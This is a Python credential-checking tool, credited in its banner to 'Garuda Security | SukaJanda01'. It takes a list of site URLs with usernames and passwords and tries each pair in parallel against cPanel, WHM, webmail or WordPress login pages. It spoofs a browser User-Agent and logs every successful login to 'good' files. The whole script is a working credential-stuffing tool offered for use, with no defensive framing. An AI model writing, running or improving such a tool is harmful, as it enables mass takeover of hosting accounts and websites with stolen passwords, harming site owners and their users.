from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
import requests

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
requests.urllib3.disable_warnings()

good_count = 0
bad_count = 0

def check(txt, check_type):
    global good_count
    global bad_count

    if check_type == "wordpress":
        check_wordpress(txt)
    else:
        url, login, password = txt.split("|")
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Origin': url,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }
        params = {'login_only': '1'}
        data = {'user': login, 'pass': password}

        try:
            response = requests.post(f'{url}/login/', params=params, headers=headers, data=data, timeout=20).json()

            if response['status'] == 1:
                print(f"{url} --> {fg}[Success]")
                good_count += 1
                open("cp_good.txt", "a").write(f'{url}|{login}|{password}\n')
            else:
                print(f"{url} --> {fr}[Failed]")
                bad_count += 1
        except requests.Timeout:
            print(f"{url} --> {fr}[Failed]")
            bad_count += 1

def check_wordpress(txt):
    global good_count
    global bad_count

    url, user, passwd = txt.split("#")[0], txt.split("#")[1].split("@")[0], txt.split("#")[1].split("@")[1]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
    }
    data = {
        'log': user,
        'pwd': passwd,
        'wp-submit': 'Log In'
    }

    try:
        response = requests.post(f'{url}/wp-login.php', headers=headers, data=data, timeout=20)

        if 'Dashboard' in response.text:
            print(f"{url} --> {fg}[Success]")
            good_count += 1
            open("wp_good.txt", "a").write(f'{url}#{user}@{passwd}\n')
        else:
            print(f"{url} --> {fr}[Failed]")
            bad_count += 1
    except requests.Timeout:
        print(f"{url} --> {fr}[Failed]")
        bad_count += 1

def main():
    global good_count
    global bad_count

    try:
        print(Fore.GREEN + ' Tools By Garuda Security | SukaJanda01')
        fileopen = input("Enter a list: ")
        check_type = input("Enter check type (whm/cpanel/webmail/wordpress): ").lower()
        thread = input("Thread: ")
        file = open(fileopen, 'r').read().splitlines()

        namafile = fileopen

        with ThreadPoolExecutor(max_workers=int(thread)) as executor:
            executor.map(check, file, [check_type] * len(file))
    except Exception as e:
        print(f"An error occurred: {e}")

    print("Total Good: ", good_count)
    print("Total Bad: ", bad_count)
    print("Nama file: ", namafile)

if __name__ == "__main__":
    main()
